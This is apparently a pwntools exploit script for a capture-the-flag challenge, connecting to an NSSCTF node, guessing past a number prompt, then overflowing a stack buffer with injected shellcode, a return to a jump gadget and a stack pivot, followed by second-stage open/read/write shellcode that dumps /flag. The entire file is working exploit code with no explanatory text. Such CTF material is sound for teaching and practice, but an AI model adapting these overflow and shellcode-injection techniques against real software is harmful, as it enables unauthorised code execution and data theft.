from pwn import *
remote_addr = ["node5.anna.nssctf.cn",28219]
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./RANDOM")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

for i in range(100):
    p.recvuntil(b'num:\n')
    p.sendline(b'1')
    st = p.recvline()
    if b'guys' in st:
        break
    
p.recvuntil(b'door\n')
orw = asm(shellcraft.open('/flag'))
orw += asm(shellcraft.read('rax', 'rsp', 100))
orw += asm(shellcraft.write(1, 'rsp', 100))

shellcode = asm(shellcraft.read(0, 'rsp', 0x50))
payload = shellcode.ljust(0x20, b'\x00') + b'a' * 8 + p64(0x40094e) + asm('sub rsp, 0x30; jmp rsp')
p.send(payload)
pause()
p.send(b'a' * 0xc + orw)


shell()
